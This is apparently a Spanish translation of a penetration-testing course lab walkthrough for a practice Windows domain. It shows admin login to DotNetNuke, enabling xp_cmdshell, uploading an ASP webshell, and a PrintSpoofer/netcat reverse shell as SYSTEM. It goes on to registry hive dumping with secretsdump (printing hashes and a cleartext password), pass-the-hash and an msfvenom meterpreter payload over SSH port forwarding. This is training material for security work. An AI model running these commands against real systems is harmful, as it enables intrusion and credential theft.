En este punto, hemos pasado de las etapas de `Information Gathering` y `Vulnerability Assessment` a la etapa de `Exploitation` del proceso de Penetration Testing. Después de obtener un punto de apoyo, enumeramos qué hosts estaban disponibles para nosotros, escaneamos los puertos abiertos y sondeamos los servicios accesibles.

---

## Attacking DNN

Vamos a DNN e intentemos nuestra suerte con el par de credenciales `Administrator:D0tn31Nuk3R0ck$$@123`. Esto es un éxito; estamos conectados como la cuenta de SuperUser administrator. Aquí querríamos registrar otros dos hallazgos de alto riesgo: `Insecure File Shares` y `Sensitive Data on File Shares`. Podríamos combinarlos en uno, pero vale la pena destacarlos como problemas separados porque si el cliente restringe el acceso anónimo, pero todos los Domain Users aún pueden acceder al share y ver datos que no son necesarios para su trabajo diario, entonces todavía hay un riesgo presente.

![text](https://academy.hackthebox.com/storage/modules/163/dnn_logged_in.png)

Una consola SQL es accesible en la página de `Settings` donde podemos habilitar `xp_cmdshell` y ejecutar comandos del sistema operativo. Podemos habilitar esto primero pegando estas líneas en la consola una por una y haciendo clic en `Run Script`. No obtendremos ninguna salida de cada comando, pero no recibir errores generalmente significa que está funcionando.

```r
EXEC sp_configure 'show advanced options', '1'
RECONFIGURE
EXEC sp_configure 'xp_cmdshell', '1' 
RECONFIGURE
```

Si esto funciona, podemos ejecutar comandos del sistema operativo en el formato `xp_cmdshell '<command here>'`. Podríamos entonces usar esto para obtener una reverse shell o trabajar en la escalada de privilegios.

![text](https://academy.hackthebox.com/storage/modules/163/sql_commands.png)

Lo que también es interesante acerca de DNN es que podemos [cambiar las extensiones de archivo permitidas](https://dnnsupport.dnnsoftware.com/hc/en-us/articles/360004928653-Allowable-File-Types-and-Extensions-for-Upload) para permitir archivos `.asp` y `.aspx` para subir. Esto es útil si no podemos obtener RCE (Remote Code Execution) a través de la consola SQL. Si esto tiene éxito, podemos subir un ASP web shell y obtener ejecución de código remoto en el servidor `DEV01`. La lista de extensiones de archivo permitidas se puede modificar para incluir .asp y .aspx navegando a `Settings -> Security -> More -> More Security Settings` y agregándolas en `Allowable File Extensions`, y haciendo clic en el botón `Save`. Una vez hecho esto, podemos subir un [ASP webshell](https://raw.githubusercontent.com/backdoorhub/shell-backdoor-list/master/shell/asp/newaspcmd.asp) después de navegar a `http://172.16.8.20/admin/file-management`. Haga clic en el botón de subir archivos y seleccione el ASP web shell que descargamos en nuestro host de ataque.

Una vez subido, podemos hacer clic derecho en el archivo subido y seleccionar `Get URL`. La URL resultante nos permitirá ejecutar comandos a través del web shell, donde podríamos entonces trabajar para obtener una reverse shell o realizar pasos de escalada de privilegios, como veremos a continuación.

![text](https://academy.hackthebox.com/storage/modules/163/asp_webshell.png)

---

## Privilege Escalation

A continuación, necesitamos escalar privilegios. En la salida del comando anterior, vimos que tenemos privilegios de `SeImpersonate`. Siguiendo los pasos en la sección [SeImpersonate and SeAssignPrimaryToken](https://academy.hackthebox.com/module/67/section/607) en el módulo de `Windows Privilege Escalation`, podemos trabajar para escalar nuestros privilegios a SYSTEM, lo que resultará en un punto de apoyo inicial en el Active Directory (AD) domain y nos permitirá comenzar a enumerar AD.

Intentaremos escalar privilegios usando la herramienta `PrintSpoofer` y luego ver si podemos obtener credenciales útiles de la memoria del host o del registro. Necesitaremos `nc.exe` en el host DEV01 para enviarnos una shell y el binario `PrintSpoofer64.exe` para aprovechar los privilegios de `SeImpersonate`. Hay algunas formas de transferirlos allí. Podríamos usar el host `dmz01` como un "jump host" y transferir nuestras herramientas a través de él mediante SCP y luego iniciar un servidor web Python3 y descargarlas en el host DEV01 usando `certutil`.

Una forma más fácil sería modificar nuevamente las `Allowable File Extensions` de DNN para permitir el formato de archivo `.exe`. Luego podemos subir ambos archivos y confirmar a través de nuestra shell que están ubicados en `c:\DotNetNuke\Portals\0`.

Una vez subidos, podemos iniciar un `Netcat` listener en el host `dmz01` y ejecutar el siguiente comando para obtener una reverse shell como `NT AUTHORITY\SYSTEM`:

```r
c:\DotNetNuke\Portals\0\PrintSpoofer64.exe -c "c:\DotNetNuke\Portals\0\nc.exe 172.16.8.120 443 -e cmd"
```

Ejecutamos el comando y obtenemos una reverse shell casi de inmediato.

```r
root@dmz01:/tmp# nc -lnvp 443

Listening on 0.0.0.0 443
Connection received on 172.16.8.20 58480
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>hostname
hostname
ACADEMY-AEN-DEV01
```

Desde aquí, podemos realizar alguna post-exploitation y recuperar manualmente el contenido de la base de datos SAM y con ella, el hash de la contraseña del administrador local.

```r
c:\DotNetNuke\Portals\0> reg save HKLM\SYSTEM SYSTEM.SAVE
reg save HKLM\SYSTEM SYSTEM.SAVE

The operation completed successfully.

c:\DotNetNuke\Portals\0> reg save HKLM\SECURITY SECURITY.SAVE
reg save HKLM\SECURITY SECURITY.SAVE

The operation completed successfully.

c:\DotNetNuke\Portals\0> reg save HKLM\SAM SAM.SAVE
reg save HKLM\SAM SAM.SAVE

The operation completed successfully.
```

Ahora podemos modificar nuevamente las extensiones de archivo permitidas para permitirnos descargar los archivos `.SAVE`. A continuación, podemos volver a la página de `File Management` y descargar cada uno de los tres archivos en nuestro host de ataque.

![text](https://academy.hackthebox.com/storage/modules/163/download_sam.png)

Finalmente, podemos usar `secretsdump` para volcar la base de datos SAM y recuperar un conjunto de credenciales de LSA secrets.

```r
secretsdump.py LOCAL -system SYSTEM.SAVE -sam SAM.SAVE -security SECURITY.SAVE

Impacket v0.9.24.dev1+20210922.102044.c7bc76f8 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0xb3a720652a6fca7e31c1659e3d619944
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<redacted>:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
mpalledorous:1001:aad3b435b51404eeaad3b435b51404ee:3bb874a52ce7b0d64ee2a82bbf3fe1cc:::
[*] Dumping cached domain logon information (domain/username:hash)
INLANEFREIGHT.LOCAL/hporter:$DCC2$10240#hporter#f7d7bba128ca183106b8a3b3de5924bc
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:3e002600200046005a003000460021004b00460071002e002b004d0042005000480045002e006c00280078007900580044003b0050006100790033006e002a0047004100590020006e002d00390059003b0035003e0077005d005f004b004900400051004e0062005700440074006b005e0075004000490061005d006000610063002400660033003c0061002b0060003900330060006a00620056006e003e00210076004a002100340049003b00210024005d004d006700210051004b002e004f007200290027004c00720030005600760027004f0055003b005500640061004a006900750032006800540033006c00
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:cb8a6327fc3dad4ea7c84b88c7542e7c
[*] DefaultPassword 
(Unknown User):Gr8hambino!
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x6968d50f5ec2bc41bc207a35f0392b72bb083c22
dpapi_userkey:0xe1e7a8bc8273395552ae8e23529ad8740d82ea92
[*] NL$KM 
 0000   21 0C E6 AC 8B 08 9B 39  97 EA D9 C6 77 DB 10 E6   !......9....w...
 0010   2E B2 53 43 7E B8 06 64  B3 EB 89 B1 DA D1 22 C7   ..SC~..d......".
 0020   11 83 FA 35 DB 57 3E B0  9D 84 59 41 90 18 7A 8D   ...5.W>...YA..z.
 0030   ED C9 1C 26 FF B7 DA 6F  02 C9 2E 18 9D CA 08 2D   ...&...o.......-
NL$KM:210ce6ac8b089b3997ead9c677db10e62eb253437eb80664b3eb89b1dad122c71183fa35db573eb09d84594190187a8dedc91c26ffb7da6f02c92e189dca082d
[*] Cleaning up... 
```

Confirmamos que estas credenciales funcionan usando `CrackMapExec` y ahora tenemos una forma de volver a este sistema en caso de que perdamos nuestra reverse shell.

```r
proxychains crackmapexec smb 172.16.8.20 --local-auth -u administrator -H <redacted>

ProxyChains-3.1 (http://proxychains.sf.net)
[*] Initializing LDAP protocol database
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.20:445-<><>-OK
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.20:445-<><>-OK
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.20:135-<><>-OK
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.20:445-<><>-OK
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.20:445-<><>-OK
SMB         172.16.8.20     445    ACADEMY-AEN-DEV  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-AEN-DEV) (domain:ACADEMY-AEN-DEV) (signing:False) (SMBv1:False)
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.20:445-<><>-OK
SMB         172.16.8.20     445    ACADEMY-AEN-DEV  [+] ACADEMY-AEN-DEV\administrator <redacted> (Pwn3d!)
```

De la salida de `secretsdump` anterior, notamos una contraseña en texto claro, pero no está inmediatamente claro para qué usuario es. Podríamos volcar LSA nuevamente usando `CrackMapExec` y confirmar que la contraseña es para el usuario `hporter`.

Ahora tenemos nuestro primer conjunto de credenciales de dominio para el dominio INLANEFREIGHT.LOCAL, `hporter:Gr8hambino!`. Podemos confirmar esto desde nuestra reverse shell en `dmz01`.

```r
c:\DotNetNuke\Portals\0> net user hporter /dom
net user hporter /dom

The request will be processed at a domain controller for domain INLANEFREIGHT.LOCAL.

User name                    hporter
Full Name                    
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            6/1/2022 11:32:05 AM
Password expires             Never
Password changeable          6/1/2022 11:32:05 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   6/21/2022 7:03:10 AM

Logon hours allowed          All

Local Group Memberships      
Global Group memberships     *Domain Users         
The command completed successfully.
```

También podríamos escalar privilegios en el host DEV01 usando la vulnerabilidad `PrintNightmare`. También hay otras formas de recuperar las credenciales, como usar Mimikatz. Juega con esta máquina y aplica las diversas habilidades que aprendiste en el `Penetration Tester Path` para realizar estos pasos de tantas maneras como sea posible para practicar y encontrar lo que mejor funcione para ti.

En este punto, no tenemos ningún hallazgo adicional para escribir porque todo lo que hicimos fue abusar de la funcionalidad incorporada, que podríamos realizar debido a los problemas de file share mencionados anteriormente. Podríamos anotar `PrintNightmare` como un hallazgo de alto riesgo si podemos explotarlo.

---

## Alternate Method - Reverse Port Forwarding

Hay muchas formas de atacar esta red y lograr los mismos resultados, por lo que no las cubriremos todas aquí, pero una que vale la pena mencionar es [Remote/Reverse Port Forwarding with SSH](https://academy.hackthebox.com/module/158/section/1427). Digamos que queremos devolver una reverse shell desde el box `DEV01` a nuestro host de ataque. No podemos hacer esto directamente ya que no estamos en la misma red, pero podemos aprovechar `dmz01` para realizar reverse port forwarding y lograr nuestro objetivo. Podríamos querer obtener una Meterpreter shell en el objetivo o una reverse shell directamente por cualquier número de razones. También podríamos haber realizado todas estas acciones sin obtener nunca una shell, ya que podríamos haber usado `PrintSpoofer` para agregar un administrador local o volcar credenciales desde `DEV01` y luego conectarnos al host de cualquier número de formas desde nuestro host de ataque usando Proxychains (pass-the-hash, RDP, WinRM, etc.). Vea cuántas formas puede lograr la misma tarea de interactuar con el host `DEV01` directamente desde su host de ataque. Es esencial ser versátil, y esta red de laboratorio es un gran lugar para practicar tantas técnicas como sea posible y perfeccionar nuestras habilidades.

Repasemos rápidamente el método de reverse port forwarding. Primero, necesitamos generar un payload usando `msfvenom`. Tenga en cuenta que aquí especificaremos la dirección IP del host pivote `dmz01` en el campo `lhost` y NO nuestra IP de host de ataque ya que el objetivo no podría conectarse a nosotros directamente.

```r
msfvenom -p windows/x64/meterpreter/reverse_https lhost=172.16.8.120 -f exe -o teams.exe LPORT=443

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 787 bytes
Final size of exe file: 7168 bytes
Saved as: teams.exe
```

A continuación, necesitamos configurar un `multi/handler` y comenzar un listener en un puerto diferente al que el payload que generamos usará.

```r
[msf](Jobs:0 Agents:0) exploit(windows/smb/smb_delivery) >> use multi/handler
[*] Using configured payload linux/x86/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lhost 0.0.0.0
lhost => 0.0.0.0
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lport 7000
lport => 7000
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run

[*] Started HTTPS reverse handler on https://0.0.0.0:7000
```

Luego, necesitamos subir el payload de reverse shell `teams.exe` al host objetivo `DEV01`. Podemos SCPearlo hasta `dmz01`, iniciar un servidor web Python en ese host y luego descargar el archivo. Alternativamente, podemos usar el administrador de archivos de DNN para subir el archivo como hicimos anteriormente. Con el payload en el objetivo, necesitamos configurar `SSH remote port forwarding` para reenviar el puerto `443` del box pivote dmz01 al puerto `7000` del listener de Metasploit. El flag `R` le dice al host pivote que escuche en el puerto `

443` y reenvíe todo el tráfico entrante a este puerto a nuestro listener de Metasploit en `0.0.0.0:7000` configurado en nuestro host de ataque.

```r
ssh -i dmz01_key -R 172.16.8.120:443:0.0.0.0:7000 root@10.129.203.111 -vN

OpenSSH_8.4p1 Debian-5, OpenSSL 1.1.1n  15 Mar 2022
debug1: Reading configuration data /etc/ssh/ssh_config
debug1: /etc/ssh/ssh_config line 19: include /etc/ssh/ssh_config.d/*.conf matched no files
debug1: /etc/ssh/ssh_config line 21: Applying options for *
debug1: Connecting to 10.129.203.111 [10.129.203.111] port 22.

<SNIP>

debug1: Authentication succeeded (publickey).
Authenticated to 10.129.203.111 ([10.129.203.111]:22).
debug1: Remote connections from 172.16.8.120:443 forwarded to local address 0.0.0.0:7000
debug1: Requesting no-more-sessions@openssh.com
debug1: Entering interactive session.
debug1: pledge: network
debug1: client_input_global_request: rtype hostkeys-00@openssh.com want_reply 0
debug1: Remote: /root/.ssh/authorized_keys:1: key options: agent-forwarding port-forwarding pty user-rc x11-forwarding
debug1: Remote: /root/.ssh/authorized_keys:1: key options: agent-forwarding port-forwarding pty user-rc x11-forwarding
debug1: Remote: Forwarding listen address "172.16.8.120" overridden by server GatewayPorts
debug1: remote forward success for: listen 172.16.8.120:443, connect 0.0.0.0:7000
```

A continuación, ejecutamos el payload teams.exe desde el host `DEV01`, y si todo va según lo planeado, obtendremos una conexión de vuelta.

```r
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> exploit

[*] Started reverse TCP handler on 0.0.0.0:7000 
[*] Sending stage (175174 bytes) to 127.0.0.1
[*] Meterpreter session 2 opened (127.0.0.1:7000 -> 127.0.0.1:51146 ) at 2022-06-22 12:21:25 -0400

(Meterpreter 2)(c:\windows\system32\inetsrv) > getuid
Server username: IIS APPPOOL\DotNetNukeAppPool
```

Un inconveniente del método anterior es que, por defecto, OpenSSH solo permite la conexión a los puertos reenviados remotamente desde el propio servidor (localhost). Para permitir esto, debemos editar el archivo `/etc/ssh/sshd_config` en sistemas Ubuntu y cambiar la línea `GatewayPorts no` a `GatewayPorts yes`, de lo contrario, no podremos recibir una llamada en el puerto que reenviamos en el comando SSH (puerto 443 en nuestro caso). Para hacer esto, necesitaríamos acceso root SSH al host que estamos usando para pivotar. A veces veremos esta configuración configurada de esta manera, por lo que funciona de inmediato, pero si no tenemos acceso root al host con la capacidad de modificar temporalmente el archivo de configuración SSH (y recargarlo para que surta efecto usando `service sshd reload`), entonces no podremos realizar port forwarding de esta manera. Tenga en cuenta que este tipo de cambio abre un agujero de seguridad en el sistema del cliente, por lo que querría aclararlo con ellos, anotar el cambio y hacer todo lo posible por revertirlo al final de la prueba. Este [post](https://www.ssh.com/academy/ssh/tunneling/example) vale la pena leer para entender mejor el SSH Remote Forwarding.

---

## Off to a Good Start

Ahora que hemos enumerado la red interna atacado nuestro primer host, escalado privilegios, realizado post-exploitation y configurado nuestros pivotes/múltiples formas de evaluar la red interna, vamos a centrar nuestra atención en el entorno de AD. Dado que tenemos un conjunto de credenciales, podemos realizar todo tipo de enumeración para obtener una mejor visión del terreno y buscar caminos hacia Domain Admin.